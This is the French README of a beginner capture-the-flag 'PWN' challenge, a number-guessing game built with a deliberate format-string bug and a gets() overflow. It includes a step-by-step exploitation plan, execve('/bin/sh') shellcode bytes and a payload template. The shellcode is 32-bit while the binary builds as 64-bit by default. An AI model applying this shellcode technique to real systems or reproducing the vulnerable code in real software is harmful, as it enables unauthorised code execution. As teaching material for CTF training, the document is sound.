# PWN Challenge - Guess Game

## Description

Un jeu simple de devinette de nombres avec des vulnérabilités exploitables.

## Objectif du Challenge

Le programme demande à l'utilisateur de:
1. Entrer son pseudo
2. Deviner un nombre généré aléatoirement (basé sur `time()`)
3. Choisir entre quitter ou continuer
4. Si continue, entrer le nom de sa petite amie

## Vulnérabilités

### 1. Format String Vulnerability
Lorsque le programme affiche le nom de la petite amie, il utilise `printf()` sans spécifier de format:
```c
printf(girlfriend_name);  // Vulnérable!
```

Cela permet de:
- Leaker des adresses mémoire avec des payloads comme `%p %p %p %p`
- Lire la stack
- Trouver l'adresse de la variable `girlfriend_name`

### 2. Buffer Overflow avec gets()
La fonction `gets()` est utilisée pour lire le nom de la petite amie:
```c
gets(girlfriend_name);  // Vulnérable!
```

Cette fonction:
- Ne vérifie pas la taille du buffer
- Permet d'écrire jusqu'à 1000 caractères ou plus
- Peut écraser la stack, incluant les adresses de retour

## Stratégie d'Exploitation

1. **Phase 1: Reconnaissance**
   - Deviner le nombre (peut être brute-forcé ou prédit avec le seed time-based)
   - Choisir l'option 'b' pour continuer

2. **Phase 2: Format String Leak**
   - Utiliser la format string vulnerability pour leaker des adresses
   - Payload exemple: `%p %p %p %p %p %p %p %p`
   - Le programme affiche aussi directement l'adresse de `girlfriend_name`
   - Trouver l'offset du buffer dans la stack

3. **Phase 3: Injection de Shellcode**
   - Créer un shellcode (exemple: execve("/bin/sh"))
   - Placer le shellcode dans le buffer `girlfriend_name`
   - Overwrite l'adresse de retour pour pointer vers le shellcode

4. **Phase 4: Execution**
   - Le programme retourne vers votre shellcode
   - Shell obtenu!

## Compilation

```bash
make
```

Le Makefile compile avec les options suivantes:
- `-fno-stack-protector`: Désactive la protection de la stack
- `-z execstack`: Rend la stack exécutable
- `-no-pie`: Désactive PIE (Position Independent Executable)
- `-g`: Ajoute les symboles de debug

Note: Le binaire est compilé en 64-bit par défaut. Pour compiler en 32-bit, ajoutez l'option `-m32` au CFLAGS (nécessite gcc-multilib).

## Utilisation

```bash
./guess_game
```

## Exemple d'Exploitation

### Étape 1: Leaker les adresses
```
Entrez votre pseudo: hacker
Devinez le nombre: [guess correctly]
Votre choix: b
Entrez le nom de votre petite amie: %p %p %p %p %p %p %p %p
```

### Étape 2: Identifier le pattern
Observer les adresses leakées et identifier où se trouve le buffer.

### Étape 3: Créer le payload
```python
import struct

# Shellcode exemple (execve /bin/sh)
shellcode = b"\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80"

# Adresse du buffer (obtenue via leak)
buffer_addr = 0xffffcxxx  # À remplacer

# Payload: NOP sled + shellcode + padding + return address
payload = b"\x90" * 50  # NOP sled
payload += shellcode
payload += b"A" * (offset - len(payload))  # Padding
payload += struct.pack("<I", buffer_addr)  # Return address

# Envoyer le payload
```

## Notes de Sécurité

Ce programme est **intentionnellement vulnérable** à des fins éducatives.

**Ne JAMAIS**:
- Utiliser `gets()` en production (deprecated et dangereux)
- Utiliser `printf(user_input)` sans format
- Compiler avec les protections désactivées

**Toujours**:
- Utiliser `fgets()` avec vérification de taille
- Utiliser `printf("%s", user_input)` avec format approprié
- Compiler avec protections activées (-fstack-protector, PIE, etc.)

## Flags de Compilation Sécurisée (pour référence)

Pour un programme sécurisé, utilisez:
```bash
gcc -fstack-protector-strong -D_FORTIFY_SOURCE=2 -pie -fPIE -Wl,-z,relro,-z,now guess_game.c -o guess_game
```

## Ressources

- [Format String Vulnerabilities](https://owasp.org/www-community/attacks/Format_string_attack)
- [Buffer Overflow Basics](https://owasp.org/www-community/vulnerabilities/Buffer_Overflow)
- [Shellcoding](https://www.exploit-db.com/docs/english/13019-shell-code-for-beginners.pdf)

## Auteur

Challenge créé pour le CTF National Togo - Catégorie PWN (Niveau Débutant)
